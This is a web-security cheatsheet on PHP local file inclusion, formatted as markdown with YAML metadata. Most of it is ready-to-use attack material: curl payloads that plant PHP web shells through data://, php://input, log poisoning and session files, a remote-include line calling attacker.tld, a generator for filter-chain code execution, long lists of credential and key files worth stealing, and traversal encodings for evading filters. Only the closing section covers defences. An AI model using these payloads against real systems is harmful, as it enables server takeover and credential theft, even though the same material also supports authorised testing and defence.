---
title: "LFI - PHP Wrappers, High-Value Paths and Traversal Encodings"
category: web
subcategory: lfi
type: cheatsheet
tags: [lfi, local-file-inclusion, rfi, path-traversal, directory-traversal, php-filter, php-wrapper, filter-chain, data-wrapper, phar, include, file-get-contents, proc-self-environ, log-poisoning, null-byte, open-basedir, allow-url-include, ffuf, burp]
summary: "Every PHP stream wrapper, the php://filter chain trick, the Linux and Windows files worth reading, log paths, /proc tricks and the traversal encoding table."
tools: [ffuf, burp, curl, php-filter-chain-generator, lfimap]
source:
  name: "PayloadsAllTheThings - File Inclusion"
  url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
related: [ssrf-payloads, command-injection-payloads, sqli-payloads]
---

## Detect and classify

```text
# Parameters worth trying: page file path template lang view doc include dir
#   load read filename document folder root pg style pdf name conf
# Example URLs that smell like LFI:
#   /index.php?page=home        /view?file=report.pdf      /?lang=en
#
# Classify what the sink actually is -- the exploitation path differs completely:
#   include/require            -> the file is EXECUTED as PHP. RCE if you control bytes.
#   file_get_contents/readfile -> the file is only READ. Wrappers still work.
#   fopen + fpassthru          -> read only.
#   a template loader          -> may append an extension, may restrict the directory.
```

```bash
# 1. does traversal reach the root at all?
curl 'http://t/?page=../../../../../../etc/passwd'

# 2. is an extension appended? (a "no such file .../etc/passwd.php" error says yes)
curl 'http://t/?page=../../../../etc/passwd%00'      # only PHP < 5.3.4
curl 'http://t/?page=../../../../etc/passwd'         # compare the two errors

# 3. is there a prefix directory? (error mentions /var/www/html/pages/...)
curl 'http://t/?page=x' -v

# 4. is it actually RFI? (allow_url_include=On -- rare but instant RCE)
curl 'http://t/?page=http://attacker.tld/shell.txt'
curl 'http://t/?page=//attacker.tld/shell.txt'       # protocol-relative
curl 'http://t/?page=\\\\attacker.tld\\share\\s.php' # SMB, Windows only

# 5. fuzz the depth -- some apps normalise, some do not
ffuf -u 'http://t/?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1234
ffuf -u 'http://t/?page=../../../../../../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common-linux-files.txt -mc 200
```

## PHP stream wrappers

```text
php://       access the various I/O streams of the running script
php://filter read a file through a chain of stream filters -- THE workhorse: it
             base64s the source so include() returns text instead of executing it
php://input  the raw POST body. If the sink is include(), POST your PHP code and it
             executes -- needs allow_url_include=On
php://stdin, php://stdout, php://stderr, php://fd/N, php://memory, php://temp
php://output write-only, goes to the output buffer

data://      the URI itself carries the content, so include(data://...) executes
             bytes you supply. Needs allow_url_include=On.
file://      the explicit form of a normal local path; sometimes bypasses a filter
             that only checks for a leading /
http://, https://, ftp://, ftps://   remote fetch -- RFI (allow_url_fopen for read,
             allow_url_include for include)
zip://       read a file INSIDE a zip archive: zip:///path/to.zip#inner.php
phar://      read inside a PHAR archive; ALSO deserialises the PHAR metadata on
             stat/file ops -> object injection even in a read-only sink (PHP < 8)
compress.zlib://   gzip-decompresses on read, alias zlib://
compress.bzip2://  bzip2-decompresses on read
glob://      enumerate paths by pattern -- a directory listing primitive
             (only via opendir/scandir, not include)
expect://    executes a command through the expect extension -- straight RCE, but
             the extension is almost never installed
ssh2://      ssh2.shell / ssh2.exec / ssh2.tunnel / ssh2.sftp -- RCE if ext-ssh2 is loaded
ogg://       audio streams (harmless)
rar://       read inside a rar archive (ext-rar)
```

```bash
# php://filter with base64 -- the single most useful LFI payload. include() would
# normally EXECUTE a .php file and you would see only its output; base64-encoding it
# first turns it into inert text that gets echoed, so you recover the SOURCE.
curl 'http://t/?page=php://filter/convert.base64-encode/resource=index.php' | base64 -d

# read the config file that holds DB creds -- the usual next step
curl 'http://t/?page=php://filter/convert.base64-encode/resource=../config.php' | base64 -d
curl 'http://t/?page=php://filter/convert.base64-encode/resource=../../.env' | base64 -d

# read= and write= name the direction explicitly; both forms are accepted
curl 'http://t/?page=php://filter/read=convert.base64-encode/resource=index.php'

# data:// -- the payload lives in the URL, so no file upload is needed.
# Requires allow_url_include=On. base64 form dodges filters that block "<?php".
curl 'http://t/?page=data://text/plain,<?php system($_GET[0]);?>&0=id'
curl 'http://t/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id'

# php://input -- the POST body becomes the included file. Also allow_url_include=On.
curl -X POST 'http://t/?page=php://input&0=id' --data '<?php system($_GET[0]);?>'

# expect:// -- direct command execution when the expect extension exists
curl 'http://t/?page=expect://id'

# zip:// -- upload a zip containing shell.php, then include the member.
# The # must be URL-encoded as %23 or the server treats it as a fragment.
zip payload.zip shell.php
curl 'http://t/?page=zip:///var/www/uploads/payload.zip%23shell.php'

# phar:// -- same idea, and the metadata is unserialized on any stat() call, so this
# reaches object injection even through file_exists()/is_file()/file_get_contents()
curl 'http://t/?page=phar:///var/www/uploads/payload.phar/shell.txt'

# glob:// -- list files matching a pattern (needs a directory-iterating sink)
curl 'http://t/?page=glob:///var/www/html/*'

# compress.zlib:// -- also useful to chain: decompress then base64
curl 'http://t/?page=compress.zlib://php://filter/convert.base64-encode/resource=index.php'
```

## php://filter conversion filters and chaining

```text
# Filters are applied left to right, separated by | . The last resource= names the file.
# Syntax:  php://filter/<f1>|<f2>|<f3>/resource=<target>

# --- string.* : simple transforms, useful to defeat a filter that greps the output
string.rot13                ROT13 -- also de-obfuscates a ROT13'd payload on the way in
string.toupper              uppercase
string.tolower              lowercase
string.strip_tags           removes HTML/PHP tags (destructive; also strips <?php)

# --- convert.base64-* : the source-disclosure workhorse
convert.base64-encode       bytes -> base64 (makes PHP inert, recovers source)
convert.base64-decode       base64 -> bytes (turns your base64 payload into code)

# --- convert.quoted-printable-*
convert.quoted-printable-encode
convert.quoted-printable-decode

# --- convert.iconv.<from>.<to> : charset conversion. This is the interesting family,
# because a conversion can ADD, DROP or REPLACE bytes deterministically -- which is
# how the filter-chain RCE below builds arbitrary bytes out of nothing.
convert.iconv.UTF-8.UTF-16LE     inserts a NUL after each ASCII byte
convert.iconv.UTF-8.UTF-16BE     inserts a NUL before each ASCII byte
convert.iconv.UTF-8.UCS-4LE      4-byte expansion
convert.iconv.UTF8.CSISO2022KR   prepends a fixed escape sequence to the stream
convert.iconv.ISO-8859-1.UTF-8   widens high bytes
convert.iconv.L1.UCS-4LE         short alias form
# (run `iconv -l` for the full list of names PHP will accept)

# --- zlib.* : compression filters
zlib.deflate                raw deflate
zlib.inflate                raw inflate
bzip2.compress
bzip2.decompress

# --- dechunk : strips HTTP chunked-transfer framing.
# Key property: on a stream that is NOT valid chunked data, dechunk DELETES everything
# up to the first newline. That "conditional delete" is the branch primitive the
# filter chain exploits.
dechunk

# --- mcrypt.* / mdecrypt.* : removed in PHP 7.2, listed for old targets
mcrypt.rijndael-128
mdecrypt.rijndael-128
```

```bash
# Chaining example: decode a base64 payload AND decompress it in one include
curl 'http://t/?page=php://filter/zlib.inflate|convert.base64-decode/resource=php://input' \
     --data 'eJxLy...'

# Double-encode to defeat a filter that scans the OUTPUT for "<?php"
curl 'http://t/?page=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php' \
  | base64 -d | base64 -d

# rot13 a payload past a filter that blocks the literal string "base64"
curl 'http://t/?page=php://filter/string.rot13/resource=index.php'
```

```text
# FILTER-CHAIN RCE (Charles Fol, 2022) -- turn a pure file-READ into arbitrary
# file-WRITE-free code execution, with NO writable file anywhere.
#
# Why it works: each convert.iconv step transforms the stream deterministically.
# By stacking hundreds of carefully chosen iconv conversions you can prepend one
# chosen byte at a time to an initially EMPTY stream, then base64-decode the result.
# The include() sink then evaluates the bytes you constructed. The only requirement
# is a php://filter-capable sink -- no upload, no log poisoning, no allow_url_include.
#
# Generate the chain rather than building it by hand:
#   git clone https://github.com/synacktiv/php_filter_chain_generator
#   python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# then request:
#   /?page=<generated php://filter/... chain>&c=id
#
# Caveat: the chain is thousands of characters long, so it needs a sink that accepts
# a long parameter (POST body, or a server with a generous URL limit).
```

## High-value Linux files

```text
/etc/passwd                     proves traversal works; lists usernames, shells and
                                home directories -> targets for ~/.ssh and ~/.bash_history
/etc/shadow                     password hashes -- root-only, so a successful read
                                means the web process runs as root
/etc/group                      group membership (docker group = container escape)
/etc/hosts                      internal hostnames -> targets for the SSRF you find next
/etc/hostname                   container id when it looks like a hex string
/etc/resolv.conf                internal DNS servers; 127.0.0.11 means Docker networking
/etc/issue, /etc/os-release     distro and version -> which exploits apply
/etc/crontab, /etc/cron.d/*     scheduled jobs -> a writable script is a privesc path
/etc/sudoers                    who can sudo what
/etc/ssh/sshd_config            PermitRootLogin, PasswordAuthentication, AllowUsers
/etc/ssh/ssh_host_*_key         host private keys (enables MITM)
/etc/fstab                      mounted shares, sometimes with credentials in options
/etc/mysql/my.cnf               DB socket path; sometimes a [client] password block
/etc/apache2/apache2.conf       vhost layout -> the real docroot for your next read
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf           same, plus upstream addresses for SSRF
/etc/nginx/sites-enabled/default
/etc/php/8.2/apache2/php.ini    open_basedir, disable_functions, allow_url_include --
                                tells you exactly which of the wrappers above will work
/etc/httpd/conf/httpd.conf      RHEL/CentOS layout
/etc/redis/redis.conf           bind address and requirepass
/etc/samba/smb.conf
/etc/knockd.conf                port-knocking sequence

~/.ssh/id_rsa  ~/.ssh/id_ed25519  ~/.ssh/authorized_keys  ~/.ssh/known_hosts
                                a readable private key is usually the whole box
~/.bash_history ~/.zsh_history  commands typed, frequently including passwords
~/.bashrc ~/.profile            aliases and exported secrets
~/.aws/credentials ~/.aws/config           cloud keys
~/.gitconfig ~/.git-credentials            repo tokens in cleartext
~/.docker/config.json           registry auth (base64 user:pass)
~/.kube/config                  cluster admin credentials
~/.netrc ~/.npmrc ~/.pypirc     package-registry tokens
~/.my.cnf                       MySQL client password
~/.msmtprc ~/.mailrc            SMTP credentials

/var/www/html/config.php        app DB credentials -- read via php://filter, not raw
/var/www/html/.env              Laravel/Symfony: APP_KEY, DB creds, API tokens
/var/www/html/wp-config.php     WordPress DB creds + auth salts
/var/www/html/.git/config       remote URL; .git/HEAD + objects = full source recovery
/var/www/html/.htaccess         rewrite rules -> hidden endpoints
/app/app.py  /app/main.py  /srv/app/...     common container docroots

/proc/version                   kernel version -> local exploit selection
/proc/cmdline                   boot args
/proc/mounts, /proc/self/mounts overlay/aufs lines confirm a container; bind mounts
                                reveal host paths
/proc/net/tcp  /proc/net/tcp6   listening sockets in hex -> internal services to SSRF
/proc/net/arp  /proc/net/route  neighbouring hosts and the gateway
/proc/net/fib_trie              every local subnet
/proc/sched_debug               process list without /proc enumeration
/proc/self/environ              the web process env: DB_PASSWORD, API keys, and on
                                CGI the full request headers (log-poisoning surface)
/proc/self/cmdline              the exact argv of the process serving you
/proc/self/cwd/index.php        /proc/self/cwd is a symlink to the working directory,
                                so this reads app files without knowing the docroot
/proc/self/root/etc/passwd      /proc/self/root is the process's / -- traverses out of
                                a chroot-style prefix
/proc/self/fd/0 .. /proc/self/fd/30   every open descriptor: log files, sockets,
                                deleted temp files, uploaded files still held open
/proc/self/maps                 loaded libraries and their base addresses -> ASLR leak,
                                and the path of every mapped file
/proc/self/status               uid/gid, CapEff (capabilities), TracerPid
/proc/self/stat                 numeric process state
/proc/[pid]/cmdline             other processes: brute-force pid 1..5000 for argv
                                secrets like `mysql -u root -pSecret`
/proc/1/cgroup                  "docker" or "kubepods" in the path confirms a container
/proc/[pid]/fd/N                read another process's open files

/var/run/secrets/kubernetes.io/serviceaccount/token      k8s SA JWT
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/*                  Docker/Swarm secrets are plain files here
/sys/class/net/eth0/address     MAC address
/sys/class/dmi/id/product_uuid  VM identity
```

## High-value Windows files

```text
C:\Windows\win.ini                              the /etc/passwd of Windows LFI: tiny,
                                                world-readable, proves traversal
C:\Windows\System32\drivers\etc\hosts           internal name mappings
C:\Windows\System32\config\SAM                  local account hashes (locked while
                                                running -- read the backup instead)
C:\Windows\System32\config\SYSTEM               boot key, needed to decrypt SAM
C:\Windows\repair\SAM      C:\Windows\repair\SYSTEM         old backups, often readable
C:\Windows\System32\config\RegBack\SAM          newer backup location
C:\Windows\Panther\Unattend.xml                 UNATTENDED INSTALL -- frequently holds
C:\Windows\Panther\Unattended.xml               a base64 local-admin password
C:\Windows\System32\sysprep\sysprep.xml
C:\Windows\System32\sysprep\Panther\unattend.xml
C:\unattend.xml   C:\sysprep.inf   C:\sysprep\sysprep.xml
C:\Windows\debug\NetSetup.log                   domain-join history
C:\Windows\iis6.log   C:\Windows\System32\Logfiles\W3SVC1\ex*.log    IIS request logs
C:\inetpub\wwwroot\web.config                   connection strings, machineKey
C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
C:\xampp\apache\conf\httpd.conf                 XAMPP layout
C:\xampp\apache\logs\access.log                 -> log poisoning target
C:\xampp\mysql\bin\my.ini                       MySQL root password sometimes inline
C:\xampp\phpMyAdmin\config.inc.php
C:\wamp\bin\apache\apache2.4.x\conf\httpd.conf
C:\Program Files\FileZilla Server\FileZilla Server.xml     cleartext FTP credentials
C:\ProgramData\McAfee\...\AgentEvents\*         (example of a service log path)
C:\Users\<user>\.ssh\id_rsa
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
                                                every PowerShell command typed
C:\Users\<user>\NTUSER.DAT                      per-user registry hive
C:\$Recycle.Bin\                                deleted files
C:\boot.ini                                     legacy, still a classic proof-of-LFI
C:\pagefile.sys                                 huge, but contains process memory

# Windows accepts both separators, and the traversal segment is ..\ or ../
..\..\..\..\Windows\win.ini
..%5c..%5c..%5cWindows%5cwin.ini
C:/Windows/win.ini                              forward slashes work in the Win32 API
\\?\C:\Windows\win.ini                          extended-length prefix skips normalisation
```

## Log poisoning (LFI to RCE)

```text
# The idea: write PHP into a file the server already creates, then include it.
# Anything of yours that lands in a log verbatim is a code-injection channel.
```

```bash
# 1. poison the Apache/nginx access log via the User-Agent (it is logged raw)
curl 'http://t/' -A '<?php system($_GET["c"]); ?>'
curl 'http://t/?page=/var/log/apache2/access.log&c=id'
curl 'http://t/?page=/var/log/nginx/access.log&c=id'

# 2. the error log takes the request path, which is logged on a 404
curl 'http://t/<?php system($_GET["c"]); ?>'
curl 'http://t/?page=/var/log/apache2/error.log&c=id'

# 3. auth.log: the SSH username is logged on a failed login
ssh '<?php system($_GET["c"]); ?>@target'
curl 'http://t/?page=/var/log/auth.log&c=id'

# 4. mail: send yourself a mail whose body is PHP, then include the spool file
telnet target 25   # MAIL FROM/RCPT TO/DATA with <?php ... ?> in the body
curl 'http://t/?page=/var/mail/www-data&c=id'
curl 'http://t/?page=/var/spool/mail/www-data&c=id'

# 5. FTP: the username of a failed login lands in vsftpd.log
curl 'http://t/?page=/var/log/vsftpd.log&c=id'

# 6. PHP session files: any value you control that PHP stores in $_SESSION is written
# verbatim into /var/lib/php/sessions/sess_<PHPSESSID>
curl 'http://t/set?name=<?php system($_GET["c"]);?>' -b 'PHPSESSID=abc123'
curl 'http://t/?page=/var/lib/php/sessions/sess_abc123&c=id'

# 7. /proc/self/environ on CGI/FastCGI setups: request headers become env vars,
# so a PHP payload in User-Agent is included straight from memory (no log rotation)
curl 'http://t/?page=/proc/self/environ&c=id' -A '<?php system($_GET["c"]); ?>'
```

```text
# Per-service log paths worth trying
/var/log/apache2/access.log      /var/log/apache2/error.log            Debian/Ubuntu
/var/log/apache2/other_vhosts_access.log
/var/log/httpd/access_log        /var/log/httpd/error_log              RHEL/CentOS
/var/log/nginx/access.log        /var/log/nginx/error.log
/var/log/lighttpd/access.log     /var/log/lighttpd/error.log
/usr/local/apache/logs/access_log                                      source builds
/usr/local/apache2/logs/access_log
/opt/lampp/logs/access_log                                             XAMPP on Linux
/var/log/auth.log                /var/log/secure                       SSH auth
/var/log/sshd.log
/var/log/vsftpd.log              /var/log/proftpd/proftpd.log          FTP
/var/log/xferlog
/var/log/mail.log                /var/log/maillog                      MTA
/var/mail/<user>                 /var/spool/mail/<user>                mail spools
/var/log/mysql/mysql.log         /var/log/mysql.log                    MySQL general log
/var/log/mysqld.log
/var/log/postgresql/postgresql-14-main.log
/var/log/redis/redis-server.log
/var/log/syslog                  /var/log/messages                     catch-all
/var/log/samba/log.smbd
/var/log/cups/error_log
/var/log/tomcat*/catalina.out    /opt/tomcat/logs/catalina.out         Java
/var/log/php_errors.log          /var/log/php-fpm/error.log
/var/lib/php/sessions/sess_<id>  /tmp/sess_<id>  /var/lib/php5/sess_<id>   sessions
```

## Traversal encoding table

```text
# Why each one works: a filter runs at ONE layer (usually a string match on the raw
# parameter), but the value is decoded again by the URL parser, the framework, the
# filesystem API, or all three. Every row below is a decode that happens AFTER the
# check the filter performed.

../                     plain traversal, the baseline
..\                     Windows separator; the Win32 API accepts both
..%2f                   URL-encoded /    -- decoded by the web server before the app sees it
..%5c                   URL-encoded \
%2e%2e%2f               URL-encoded ../  entirely
%2e%2e/                 mixed encoding -- defeats a filter matching the literal "../"
..%252f                 DOUBLE URL-encoded / : %25 -> % on the first decode, then %2f -> /
                        on a second decode. Works when a proxy decodes once and the app
                        decodes again.
%252e%252e%252f         fully double-encoded ../
%c0%ae%c0%ae/           UTF-8 OVERLONG encoding of '.': 0xC0 0xAE decodes to U+002E on a
                        lenient decoder even though it is an illegal 2-byte form.
                        Filters look for '.', the decoder produces one.
%e0%80%ae               3-byte overlong '.'
%c0%af                  overlong '/'  (0xC0 0xAF)
%e0%80%af               3-byte overlong '/'
%c1%9c                  overlong '\'  -- the classic IIS Unicode traversal (CVE-2000-0884)
%u002e%u002e%u002f      16-bit %u escapes -- an IIS/ASP-ism; the server decodes %uXXXX
                        to the UTF-16 code unit, so this is ../ after decoding
%uff0e%uff0e%uff0f      FULLWIDTH forms U+FF0E / U+FF0F. They are not '.' or '/', but a
                        Unicode NFKC normalisation step maps them to ASCII afterwards.
....//                  self-referencing bypass: a filter that strips "../" ONCE and
                        non-recursively turns ....// into ../
..././                  same trick with a different arrangement
....\/                  mixed-separator variant
..;/                    a path PARAMETER segment. Tomcat/Jetty/Spring treat everything
                        after ';' as a matrix parameter and drop it, so the security
                        filter sees a different path than the file resolver does.
%00                     NULL BYTE truncation: C's open() stops at the NUL, so
                        "/etc/passwd\0.php" opens /etc/passwd while PHP's own string
                        still ends in .php. Fixed in PHP 5.3.4+ -- only for old targets.
%2500                   double-encoded null byte
?                       path truncation via a query-like char on some frameworks
#                       fragment truncation, same idea (send as %23 to reach the server)
/././././               no-op segments -- pads the string past a length-based check
//////etc/passwd        repeated slashes normalise to one; defeats a regex anchored on
                        a single leading /
/etc/passwd/.           trailing /. normalises away
/etc/passwd/..%2f..%2fetc/passwd    re-ascend after a forced-prefix check
./../.../.././          mixed noise to defeat a naive replace loop
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     everything encoded, no literal separators
/proc/self/root/etc/passwd          absolute path that bypasses a "must start with our
                                    base dir" check because /proc/self/root IS /
```

```bash
# forced prefix: the app does include("/var/www/pages/" . $p . ".php")
# -> you must ascend out of /var/www/pages AND kill the .php suffix
curl 'http://t/?page=../../../../etc/passwd%00'                       # old PHP only
curl 'http://t/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd'
# (the wrapper form works because php://filter never appends the extension to the
#  wrapper prefix -- only to the resource, which ends up as /etc/passwd.php; when
#  that fails, the reliable answer is a path that legitimately ends in .php)

# find the depth empirically rather than guessing -- 8 is almost always enough
for i in $(seq 1 10); do
  p=$(python3 -c "print('../'*$i)")
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://t/?page=${p}etc/passwd")
  echo "$i -> $code"
done
```

## Defence

```php
<?php
// 1. NEVER put user input in a filesystem path. Map an opaque key to a fixed path.
//    This is the only defence that cannot be bypassed, because no byte of input
//    reaches the filesystem API at all.
$PAGES = [
    'home'    => __DIR__ . '/pages/home.php',
    'about'   => __DIR__ . '/pages/about.php',
    'contact' => __DIR__ . '/pages/contact.php',
];
$key = $_GET['page'] ?? 'home';
if (!isset($PAGES[$key])) { http_response_code(404); exit; }
require $PAGES[$key];
```

```php
<?php
// 2. If a path really must be dynamic: canonicalise FIRST with realpath(), then
//    check containment. realpath() resolves .. , symlinks and duplicate slashes, so
//    the string you validate is the string the kernel will open -- this closes the
//    entire encoding table above in one step.
//    Order matters: validating before canonicalising is the classic TOCTOU bug.
$base = realpath(__DIR__ . '/pages');
$real = realpath($base . '/' . $_GET['page']);

if ($real === false || !str_starts_with($real, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(404); exit;                 // outside the jail, or does not exist
}
// also pin the extension, so an uploaded .php elsewhere in the tree cannot be reached
if (pathinfo($real, PATHINFO_EXTENSION) !== 'php') { http_response_code(404); exit; }
readfile($real);   // readfile, not include -- do not execute data
```

```python
# 3. Python equivalent -- Path.resolve() then is_relative_to()
from pathlib import Path

BASE = Path("/srv/app/pages").resolve()

def safe_open(user_path: str):
    target = (BASE / user_path).resolve()
    if not target.is_relative_to(BASE):      # Python 3.9+
        raise PermissionError("traversal blocked")
    return target.read_bytes()
```

```ini
; 4. php.ini hardening -- defence in depth, not a substitute for the above
allow_url_include = Off     ; kills data:// php://input and remote include RCE
allow_url_fopen   = Off     ; kills http:// reads too (also kills legitimate ones)
open_basedir      = /var/www/html:/tmp
                            ; the include/fopen family is confined to these trees.
                            ; Note: it does NOT block php://filter on files INSIDE
                            ; the tree, and it does not apply to exec()'d processes.
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
expose_php        = Off
display_errors    = Off     ; error text is how you found the prefix and the extension
log_errors        = On
session.save_path = /var/lib/php/sessions   ; keep sessions out of a web-readable dir
```

```text
# 5. Structural controls
#   - serve static files with the web server, not through a PHP handler
#   - store uploads OUTSIDE the docroot, rename them to a random id, and never
#     preserve the client-supplied extension (this closes zip:// and phar://)
#   - run PHP 8+: phar:// no longer deserialises metadata on plain stat() calls
#   - drop the web user's ability to read what it does not need (systemd
#     ProtectHome=yes, ReadOnlyPaths=/, or a container with a minimal filesystem)
#   - do not let the app read its own logs: log poisoning needs both a write path
#     and a read path -- removing either one breaks the chain
#   - a WAF rule matching "../" catches none of the encodings above; treat it as
#     telemetry, not as a control
```

## References

- https://owasp.org/www-community/attacks/Path_Traversal
- https://portswigger.net/web-security/file-path-traversal
- https://portswigger.net/web-security/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://www.php.net/manual/en/wrappers.php
- https://www.php.net/manual/en/filters.php
- https://github.com/synacktiv/php_filter_chain_generator
